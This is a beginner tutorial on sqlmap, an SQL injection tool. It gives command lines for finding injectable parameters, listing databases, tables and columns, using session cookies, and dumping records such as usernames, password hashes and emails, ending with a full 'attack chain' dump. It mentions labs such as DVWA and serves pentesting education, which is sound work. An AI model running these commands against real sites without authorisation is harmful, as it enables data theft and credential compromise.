Sqlmap is a tool that **automatically tests and exploits SQL injection vulnerabilities in web applications**.

Instead of you manually trying payloads, it:
- finds injection points
- checks if they are vulnerable
- figures out database type
- extracts data if allowed

# 1. Basic testing command

```
sqlmap -u "http://target.com/page.php?id=1" --batch
```

### Meaning:

- `-u` → target URL (with a parameter like `id=1`)
- `--batch` → auto-answer prompts (no manual input)

👉 **What it does:**  
Checks if the parameter is vulnerable to SQL injection automatically.

# 2. Find databases

```
sqlmap -u "URL" --dbs
```

### Meaning:

- `--dbs` → list all databases in backend system

👉 **What it does:**  
If injection exists, it shows database names like:

- users_db
- shop_db

# 3. Select a database and list tables

```
sqlmap -u "URL" -D database_name --tables
```

### Meaning:

- `-D` → choose database
- `--tables` → show tables inside that database

👉 **What it does:**  
Shows tables like:

- users
- products
- admin

# 4. Select table and show columns

```
sqlmap -u "URL" -D database_name -T table_name --columns
```

### Meaning:

- `-T` → choose table
- `--columns` → show column names

👉 **What it does:**  
Shows structure like:

- username
- password
- email

# 5. Extract data (dump table)

```
sqlmap -u "URL" -D database_name -T table_name --dump
```

### Meaning:

- `--dump` → extract all data from table

👉 **What it does:**  
Pulls real records like:

- usernames
- hashed passwords
- emails

# 6. Get everything automatically (aggressive mode)

```
sqlmap -u "URL" --dbs --batch --risk=2 --level=3
```

### Meaning:

- `--risk` → how aggressive tests are (0–3)
- `--level` → how deep testing goes (1–5)

👉 **What it does:**  
Stronger scanning, more injection tests.

---

# 7. Cookie-based login targets

```
sqlmap -u "URL" --cookie="PHPSESSID=abc123; security=low" --dbs
```

### Meaning:

- `--cookie` → sends session login info

👉 **What it does:**  
Lets sqlmap access logged-in pages (like DVWA).

---

# 8. Test only forms on a page

```
sqlmap -u "URL" --forms
```

### Meaning:

- `--forms` → auto-detect and test input forms

👉 **What it does:**  
Tests login/search boxes automatically.

---

# 9. Check full request (advanced real-world use)

```
sqlmap -r request.txt --dbs
```

### Meaning:

- `-r` → use captured HTTP request file (from Burp/ZAP)

👉 **What it does:**  
Most realistic pentesting method used in industry.

---

# 10. Identify database type

```
sqlmap -u "URL" --banner
```

### Meaning:

- `--banner` → shows DB version/type

👉 **What it does:**  
Example output:

- MySQL 5.7
- PostgreSQL 12

---

# 11. Full automation (beginner mode)

```
sqlmap -u "URL" --batch --dbs --tables --columns --dump
```

### Meaning:

Runs full attack chain:

1. Find DBs
2. Find tables
3. Find columns
4. Extract data

👉 **What it does:**  
Complete database extraction (only in labs).
